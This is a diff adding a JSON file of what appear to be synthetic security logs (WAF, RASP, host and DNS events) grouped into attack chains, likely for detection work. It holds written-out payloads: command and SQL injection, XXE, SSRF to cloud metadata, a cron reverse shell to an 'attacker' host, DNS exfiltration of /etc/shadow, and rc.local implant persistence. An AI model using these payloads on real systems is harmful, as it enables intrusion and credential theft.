@@ -1,0 +1,689 @@
+[
+ {
+  "unit": 1,
+  "file": "911-920",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-08 09:24:04",
+    "source": "hids",
+    "log_id": "HID0053805",
+    "content": "ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.3.138 \"id; hostname\" ssh ssh -i /tmp/.key -o StrictHos"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-28 07:43:08",
+    "source": "dns",
+    "log_id": "DNS0200633",
+    "content": "2ab0df32.lvscco-60c8.net A 10.10.32.171"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-28 07:44:48",
+    "source": "dns",
+    "log_id": "DNS0200648",
+    "content": "dccc1ee0.lvscco-60c8.net A 203.0.113.102"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-28 07:45:28",
+    "source": "dns",
+    "log_id": "DNS0200650",
+    "content": "af02e69e.lvscco-60c8.net A 10.10.36.7"
+   }
+  ]
+ },
+ {
+  "unit": 2,
+  "file": "911-920",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-01 20:04:36",
+    "source": "waf",
+    "log_id": "WAF0005562",
+    "content": "/api/v1/ping?cmd=127.0.0.1;id handle=com.tangosol.coherence.mvel2.sh.ShellSession&cmd=id Mozilla/5.0 (Windows "
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-01 20:04:37",
+    "source": "web",
+    "log_id": "WEB0005717",
+    "content": "/api/v1/ping?cmd=127.0.0.1;id handle=com.tangosol.coherence.mvel2.sh.ShellSession&cmd=id Mozilla/5.0 (Windows "
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-01 20:04:38",
+    "source": "rasp",
+    "log_id": "RASP0006051",
+    "content": "https://app-go-83.ops-corp.com/api/v1/ping?cmd=127.0.0.1;id {\"cmd\": \"127.0.0.1;id\"} Mozilla/5.0 (Windows NT 10"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-01 20:05:36",
+    "source": "hids",
+    "log_id": "HID0005785",
+    "content": "cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/sh -c 'cat /etc/passwd' <== /opt/app/main"
+   }
+  ]
+ },
+ {
+  "unit": 3,
+  "file": "911-920",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-02 06:59:52",
+    "source": "waf",
+    "log_id": "WAF0008800",
+    "content": "/api/v1/ping?cmd=127.0.0.1;id /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+ad"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-02 06:59:53",
+    "source": "web",
+    "log_id": "WEB0008946",
+    "content": "/api/v1/ping?cmd=127.0.0.1;id /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+ad"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-02 06:59:54",
+    "source": "rasp",
+    "log_id": "RASP0009685",
+    "content": "https://app-go-128.ops-corp.com/api/v1/ping?cmd=127.0.0.1;id {\"cmd\": \"127.0.0.1;id\"} Mozilla/5.0 (Windows NT 1"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-02 07:00:52",
+    "source": "hids",
+    "log_id": "HID0008678",
+    "content": "cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/sh -c 'cat /etc/passwd' <== /usr/local/bin/app-server"
+   }
+  ]
+ },
+ {
+  "unit": 4,
+  "file": "911-920",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-03 03:15:17",
+    "source": "waf",
+    "log_id": "WAF0014731",
+    "content": "/api/products?category=' OR '1'='1 filename=548979.phar&content=__HALT_COMPILER();^@^@^@^A^@5489^@^@^@^@ Mozilla/5.0 (M"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-03 03:15:18",
+    "source": "web",
+    "log_id": "WEB0014758",
+    "content": "/api/products?category=' OR '1'='1 filename=548979.phar&content=__HALT_COMPILER();^@^@^@^A^@5489^@^@^@^@ Mozilla/5.0 (M"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-03 03:15:19",
+    "source": "rasp",
+    "log_id": "RASP0016195",
+    "content": "https://app-rails-11.ops-corp.com/api/products?category=' OR '1'='1 {\"deserialization\": \"AAIJABIAAAA=\", \"cmd\":"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-03 03:16:17",
+    "source": "hids",
+    "log_id": "HID0014150",
+    "content": "cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== bundle exec rails server -b 0."
+   }
+  ]
+ },
+ {
+  "unit": 5,
+  "file": "911-920",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-03 05:18:46",
+    "source": "waf",
+    "log_id": "WAF0015324",
+    "content": "/api/v1/query ${script:javascript:java.lang.Runtime.getRuntime().exec('id')} Mozilla/5.0 (X11; Linux x86_64) A"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-03 05:18:47",
+    "source": "web",
+    "log_id": "WEB0015304",
+    "content": "/api/v1/query ${script:javascript:java.lang.Runtime.getRuntime().exec('id')} Mozilla/5.0 (X11; Linux x86_64) A"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-03 05:18:48",
+    "source": "rasp",
+    "log_id": "RASP0016842",
+    "content": "https://app-spring-38.ops-corp.com/api/v1/query {\"spring.cloud.function.routing-expression\": \"T(java.lang.Runt"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-03 05:19:46",
+    "source": "hids",
+    "log_id": "HID0014827",
+    "content": "cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/sh -c 'cat /etc/passwd' <== java -jar /opt/app/spring-boot-a"
+   }
+  ]
+ },
+ {
+  "unit": 6,
+  "file": "911-920",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-03 16:22:50",
+    "source": "waf",
+    "log_id": "WAF0018413",
+    "content": "/api/token key=/var/spool/cron/root&value=*/1+*+*+*+*+bash+-i+>&+/dev/tcp/attacker/4444+0>&1 Mozilla/5.0 (Wind"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-03 16:22:51",
+    "source": "web",
+    "log_id": "WEB0018557",
+    "content": "/api/token key=/var/spool/cron/root&value=*/1+*+*+*+*+bash+-i+>&+/dev/tcp/attacker/4444+0>&1 Mozilla/5.0 (Wind"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-03 16:22:52",
+    "source": "rasp",
+    "log_id": "RASP0020439",
+    "content": "https://app-php-186.ops-corp.com/api/token {\"cmd_inject\": \"#!//bin/bash\"} Mozilla/5.0 (Windows NT 10.0; Win64;"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-03 16:23:50",
+    "source": "hids",
+    "log_id": "HID0017782",
+    "content": "cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/dash -c 'cat /etc/passwd' <== php-fpm: pool www"
+   }
+  ]
+ },
+ {
+  "unit": 7,
+  "file": "911-920",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-07 12:53:54",
+    "source": "waf",
+    "log_id": "WAF0044808",
+    "content": "/user/register?cmd_inject=#!//bin/bash id=1 UNION SELECT username,password,email FROM users LIMIT 100-- Mozill"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-07 12:53:55",
+    "source": "web",
+    "log_id": "WEB0045299",
+    "content": "/user/register?cmd_inject=#!//bin/bash id=1 UNION SELECT username,password,email FROM users LIMIT 100-- Mozill"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-07 12:53:56",
+    "source": "rasp",
+    "log_id": "RASP0049484",
+    "content": "https://app-php-17.ops-corp.com/user/register?cmd_inject=#!//bin/bash {\"cmd_inject\": \"#!//bin/bash\"} Mozilla/5"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-07 12:54:54",
+    "source": "hids",
+    "log_id": "HID0046182",
+    "content": "cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/sh -c 'cat /etc/passwd' <== /usr/sbin/php-fpm -y /etc/php-fp"
+   }
+  ]
+ },
+ {
+  "unit": 8,
+  "file": "911-920",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-07 19:45:59",
+    "source": "waf",
+    "log_id": "WAF0046873",
+    "content": "/api/exec?cmd=id cache_key=../../../tmp/7abd7f Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-07 19:46:00",
+    "source": "web",
+    "log_id": "WEB0047320",
+    "content": "/api/exec?cmd=id cache_key=../../../tmp/7abd7f Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-07 19:46:01",
+    "source": "rasp",
+    "log_id": "RASP0051720",
+    "content": "https://app-node-126.ops-corp.com/api/exec?cmd=id {\"smuggle\": \"GET / HTTP/1.1\", \"cmd\": \"cmd=id\"} Mozilla/5.0 ("
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-07 19:46:59",
+    "source": "hids",
+    "log_id": "HID0048638",
+    "content": "cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== /usr/bin/node /opt/app/index.j"
+   }
+  ]
+ },
+ {
+  "unit": 9,
+  "file": "911-920",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-08 01:26:31",
+    "source": "waf",
+    "log_id": "WAF0048559",
+    "content": "/index.php?s=a/b/c&_method=__construct&method=GET&filter[]=system echo;id Mozilla/5.0 (Windows NT 10.0; Win64;"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-08 01:26:32",
+    "source": "web",
+    "log_id": "WEB0048952",
+    "content": "/index.php?s=a/b/c&_method=__construct&method=GET&filter[]=system echo;id Mozilla/5.0 (Windows NT 10.0; Win64;"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-08 01:26:33",
+    "source": "rasp",
+    "log_id": "RASP0053490",
+    "content": "https://app-php-54.ops-corp.com/index.php?s=a/b/c&_method=__construct&method=GET&filter[]=system {\"cmd\": \"s=a/"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-08 01:27:31",
+    "source": "hids",
+    "log_id": "HID0050931",
+    "content": "cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/dash -c 'cat /etc/passwd' <== php-fpm: pool www"
+   }
+  ]
+ },
+ {
+  "unit": 10,
+  "file": "911-920",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-08 02:51:07",
+    "source": "waf",
+    "log_id": "WAF0048938",
+    "content": "/api/v1/proxy?smuggle=GET / HTTP/1.1 <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.1"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-08 02:51:08",
+    "source": "web",
+    "log_id": "WEB0049346",
+    "content": "/api/v1/proxy?smuggle=GET / HTTP/1.1 <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.1"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-08 02:51:09",
+    "source": "rasp",
+    "log_id": "RASP0053900",
+    "content": "https://app-node-60.ops-corp.com/api/v1/proxy?smuggle=GET / HTTP/1.1 {\"smuggle\": \"GET / HTTP/1.1\"} Mozilla/5.0"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-08 02:52:07",
+    "source": "hids",
+    "log_id": "HID0051474",
+    "content": "cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/sh -c 'cat /etc/passwd' <== /usr/bin/node /opt/app/server.js"
+   }
+  ]
+ },
+ {
+  "unit": 11,
+  "file": "9101-9110",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-28 14:49:01",
+    "source": "waf",
+    "log_id": "WAF0190932",
+    "content": "/public/plugins/alertlist/../../../etc/passwd Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KH"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-28 14:49:02",
+    "source": "web",
+    "log_id": "WEB0192222",
+    "content": "/public/plugins/alertlist/../../../etc/passwd Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KH"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-28 14:49:03",
+    "source": "rasp",
+    "log_id": "RASP0211223",
+    "content": "https://app-nginx-59.ops-corp.com/public/plugins/alertlist/../../../etc/passwd {\"cmd\": \"/public/plugins/alertl"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-28 14:50:31",
+    "source": "hids",
+    "log_id": "HID0207793",
+    "content": "for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $svc-2f623.system.org; done for for line"
+   }
+  ]
+ },
+ {
+  "unit": 12,
+  "file": "9101-9110",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-28 22:51:33",
+    "source": "waf",
+    "log_id": "WAF0193272",
+    "content": "/api/fetch?url=http://169.254.169.254/latest/meta-data/ Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleW"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-28 22:51:34",
+    "source": "web",
+    "log_id": "WEB0194490",
+    "content": "/api/fetch?url=http://169.254.169.254/latest/meta-data/ Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleW"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-28 22:51:35",
+    "source": "rasp",
+    "log_id": "RASP0213807",
+    "content": "https://app-node-173.ops-corp.com/api/fetch?url=http://169.254.169.254/latest/meta-data/ {\"cmd\": \"url=http://1"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-28 22:53:03",
+    "source": "hids",
+    "log_id": "HID0210069",
+    "content": "for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $node-602.host.com; done for for line in"
+   }
+  ]
+ },
+ {
+  "unit": 13,
+  "file": "9101-9110",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-29 01:41:29",
+    "source": "waf",
+    "log_id": "WAF0194114",
+    "content": "/public/plugins/alertlist/../../../../etc/passwd Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/454"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-29 01:41:30",
+    "source": "web",
+    "log_id": "WEB0195335",
+    "content": "/public/plugins/alertlist/../../../../etc/passwd Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/454"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-29 01:41:31",
+    "source": "rasp",
+    "log_id": "RASP0214716",
+    "content": "https://app-nginx-102.ops-corp.com/public/plugins/alertlist/../../../../etc/passwd {\"cmd\": \"/public/plugins/al"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-29 01:42:59",
+    "source": "hids",
+    "log_id": "HID0210856",
+    "content": "for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $44314c92.ops309.com; done for for line "
+   }
+  ]
+ },
+ {
+  "unit": 14,
+  "file": "9101-9110",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-29 13:58:04",
+    "source": "waf",
+    "log_id": "WAF0197633",
+    "content": "/api/v1/dags/run?cmd_inject=;id script=throw+new+Exception(\"id\".execute().text) Mozilla/5.0 (iPhone; CPU iPhon"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-29 13:58:05",
+    "source": "web",
+    "log_id": "WEB0198937",
+    "content": "/api/v1/dags/run?cmd_inject=;id script=throw+new+Exception(\"id\".execute().text) Mozilla/5.0 (iPhone; CPU iPhon"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-29 13:58:06",
+    "source": "rasp",
+    "log_id": "RASP0218697",
+    "content": "https://app-django-176.ops-corp.com/api/v1/dags/run?cmd_inject=;id {\"cmd_inject\": \";id\"} Mozilla/5.0 (iPhone; "
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-29 13:59:34",
+    "source": "hids",
+    "log_id": "HID0214473",
+    "content": "for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $df9167.log-358.net; done for for line i"
+   }
+  ]
+ },
+ {
+  "unit": 15,
+  "file": "9101-9110",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-29 21:59:25",
+    "source": "waf",
+    "log_id": "WAF0200039",
+    "content": "/api/fetch?url=http://169.254.169.254/latest/meta-data/ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-29 21:59:26",
+    "source": "web",
+    "log_id": "WEB0201341",
+    "content": "/api/fetch?url=http://169.254.169.254/latest/meta-data/ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-29 21:59:27",
+    "source": "rasp",
+    "log_id": "RASP0221307",
+    "content": "https://app-node-17.ops-corp.com/api/fetch?url=http://169.254.169.254/latest/meta-data/ {\"cmd\": \"url=http://16"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-29 22:00:55",
+    "source": "hids",
+    "log_id": "HID0216784",
+    "content": "for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $node-623.cloud.io; done for for line in"
+   }
+  ]
+ },
+ {
+  "unit": 16,
+  "file": "9101-9110",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-01 01:09:59",
+    "source": "waf",
+    "log_id": "WAF0000272",
+    "content": "/public/../../../etc/passwd cache_key=../../../tmp/fc04ac Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-01 01:10:00",
+    "source": "web",
+    "log_id": "WEB0000267",
+    "content": "/public/../../../etc/passwd cache_key=../../../tmp/fc04ac Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-01 01:10:01",
+    "source": "rasp",
+    "log_id": "RASP0000266",
+    "content": "https://app-node-67.ops-corp.com/public/../../../etc/passwd {\"smuggle\": \"GET / HTTP/1.1\", \"cmd\": \"url=http://1"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-01 01:11:59",
+    "source": "hids",
+    "log_id": "HID0000310",
+    "content": "sed -i \"s/exit 0/\\/tmp\\/.svc -d\\nexit 0/\" /etc/rc.local sed sed -i \"s/exit 0/\\/tmp\\/.svc -d\\nexit 0/\" /etc/rc."
+   }
+  ]
+ },
+ {
+  "unit": 17,
+  "file": "9101-9110",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-01 10:21:53",
+    "source": "waf",
+    "log_id": "WAF0002772",
+    "content": "/index.php/fpm_path?cmd=id id=1; EXEC master..xp_dirtree '\\\\sync-466.metric.net\\share'-- Mozilla/5.0 (X11; Ubu"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-01 10:21:54",
+    "source": "web",
+    "log_id": "WEB0002764",
+    "content": "/index.php/fpm_path?cmd=id id=1; EXEC master..xp_dirtree '\\\\sync-466.metric.net\\share'-- Mozilla/5.0 (X11; Ubu"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-01 10:21:55",
+    "source": "rasp",
+    "log_id": "RASP0002931",
+    "content": "https://app-nginx-92.ops-corp.com/index.php/fpm_path?cmd=id {\"cmd\": \"id\"} Mozilla/5.0 (X11; Ubuntu; Linux x86_"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-01 10:23:53",
+    "source": "hids",
+    "log_id": "HID0002965",
+    "content": "echo \"/tmp/.implant &\" >> /etc/rc.local echo echo \"/tmp/.implant &\" >> /etc/rc.local <== /bin/dash -c 'echo \"/"
+   }
+  ]
+ },
+ {
+  "unit": 18,
+  "file": "9101-9110",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-01 13:32:12",
+    "source": "waf",
+    "log_id": "WAF0003691",
+    "content": "/static/../../../etc/passwd?path=/etc/passwd mount -t overlay overlay -o lowerdir=/lower,upperdir=/tmp/26ef4d/"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-01 13:32:13",
+    "source": "web",
+    "log_id": "WEB0003706",
+    "content": "/static/../../../etc/passwd?path=/etc/passwd mount -t overlay overlay -o lowerdir=/lower,upperdir=/tmp/26ef4d/"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-01 13:32:14",
+    "source": "rasp",
+    "log_id": "RASP0003945",
+    "content": "https://app-node-186.ops-corp.com/static/../../../etc/passwd?path=/etc/passwd {\"path\": \"/etc/passwd\"} Mozilla/"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-01 13:34:12",
+    "source": "hids",
+    "log_id": "HID0003875",
+    "content": "sed -i \"s/exit 0/\\/tmp\\/.svc -d\\nexit 0/\" /etc/rc.local sed sed -i \"s/exit 0/\\/tmp\\/.svc -d\\nexit 0/\" /etc/rc."
+   }
+  ]
+ },
+ {
+  "unit": 19,
+  "file": "9101-9110",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-02 02:18:19",
+    "source": "waf",
+    "log_id": "WAF0007450",
+    "content": "/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id id=1; EXEC xp_cmdshell('id')-- Mozilla/5.0 (Linux; Android 14; Pixel 8) "
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-02 02:18:20",
+    "source": "web",
+    "log_id": "WEB0007555",
+    "content": "/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id id=1; EXEC xp_cmdshell('id')-- Mozilla/5.0 (Linux; Android 14; Pixel 8) "
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-02 02:18:21",
+    "source": "rasp",
+    "log_id": "RASP0008125",
+    "content": "https://app-php-201.ops-corp.com/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id {\"cmd\": \"echo;id\"} Mozilla/5.0 (Linux; A"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-02 02:19:49",
+    "source": "hids",
+    "log_id": "HID0007462",
+    "content": "cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/dash -c 'cat /etc/passwd' <== /usr/bin/php-cgi -b 127.0.0.1:"
+   },
+   {
+    "n": 5,
+    "ts": "2026-05-02 02:20:19",
+    "source": "hids",
+    "log_id": "HID0007465",
+    "content": "echo \"/tmp/.implant &\" >> /etc/rc.local echo echo \"/tmp/.implant &\" >> /etc/rc.local <== /bin/dash -c 'echo \"/"
+   }
+  ]
+ },
+ {
+  "unit": 20,
+  "file": "9101-9110",
+  "entries": [
+   {
+    "n": 1,
+    "ts": "2026-05-02 04:43:57",
+    "source": "waf",
+    "log_id": "WAF0008140",
+    "content": "/api/posts?order=id;SELECT sleep(5)-- _method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=id"
+   },
+   {
+    "n": 2,
+    "ts": "2026-05-02 04:43:58",
+    "source": "web",
+    "log_id": "WEB0008267",
+    "content": "/api/posts?order=id;SELECT sleep(5)-- _method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=id"
+   },
+   {
+    "n": 3,
+    "ts": "2026-05-02 04:43:59",
+    "source": "rasp",
+    "log_id": "RASP0008919",
+    "content": "https://app-rails-210.ops-corp.com/api/posts?order=id;SELECT sleep(5)-- {\"path_traversal\": \"../config/database"
+   },
+   {
+    "n": 4,
+    "ts": "2026-05-02 04:45:57",
+    "source": "hids",
+    "log_id": "HID0008112",
+    "content": "echo \"/tmp/.implant &\" >> /etc/rc.local echo echo \"/tmp/.implant &\" >> /etc/rc.local <== /bin/sh -c 'echo \"/tm"
+   }
+  ]
+ }
+]
